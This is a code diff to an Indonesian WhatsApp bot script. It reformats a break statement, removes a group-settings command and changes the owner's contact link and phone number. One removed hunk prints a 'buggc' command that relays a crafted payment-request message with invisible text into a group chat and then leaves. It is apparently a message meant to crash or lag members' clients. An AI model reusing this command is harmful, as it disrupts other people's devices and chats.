@@ -797,14 +797,6 @@ xavior.sendMessage(m.chat, { video: smeme, mimetype: 'video/mp4', fileName: `Int
           m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
             }
             break
-            case 'buggc':
-                     if (!isGroup) throw mess.group
-                     if (!isCreator && !msg.key.fromMe) throw mess.owner
-                     requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
-                     xavior.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-                     await sleep(2000)
-                     await xavior.groupLeave(from)
-                     break
 	case 'kick': {
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
@@ -885,8 +877,8 @@ xavior.sendMessage(m.chat, { video: smeme, mimetype: 'video/mp4', fileName: `Int
             case 'namafotobot|subscribe': {
              if (!isCreator) throw mess.owner
              xavior.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `Foto menu Berhasil Diganti\n\nHei Lord *MBY•OFFICIAL*..🙏\n\nJangan Sering Sering Ubah Fot Bot Yah🗿` }, { quoted: m })
-            } break
-            
+            } 
+               break
            case 'setppgroup': case 'setppgrup': case 'setppgc': {
                 if (!m.isGroup) throw mess.group
                 if (!isAdmins) throw mess.admin
@@ -1157,14 +1149,6 @@ break
                 }
              }
              break
-             case 'groupsetting': case 'groupss': {
-if (!isGroup) throw mess.group
-if (!isAdmins) throw mess.admin
-if (!isBotAdmins) throw mess.botAdmin
-if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `groupsetting open`, buttonText: { displayText: "OPEN" }, type: 1},{ buttonId: `groupsetting close`, buttonText: { displayText: "CLOSE" }, type: 1}], {quoted:msg})
-if (dn === 'open'){ await xavior.groupSettingUpdate(from, 'not_announcement')
-} else if (dn === 'close'){ await xavior.groupSettingUpdate(from, 'announcement')} else { reply('Error')}
-break
              case 'mute': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
@@ -1260,12 +1244,12 @@ break
                     let btn = [{
                                 urlButton: {
                                     displayText: 'Script',
-                                    url: 'https://youtube.com/channel/UCmUhiytK9WMYaOFgdOho_2g'
+                                    url: 'wa.me/6282180026483'
                                 }
                             }, {
                                 callButton: {
                                     displayText: 'Number Phone Owner',
-                                    phoneNumber: '+62 815-1148-0762'
+                                    phoneNumber: '+62 821-8002-6483'
                                 }
                             }, {
                                 quickReplyButton: {
@@ -1299,7 +1283,7 @@ break
 		    let btn = [{
                                 urlButton: {
                                     displayText: 'Script',
-                                    url: 'https://youtube.com/channel/UCmUhiytK9WMYaOFgdOho_2g'
+                                    url: 'wa.me/6282180026483'
                                 }
                             }, {
                                 quickReplyButton: {
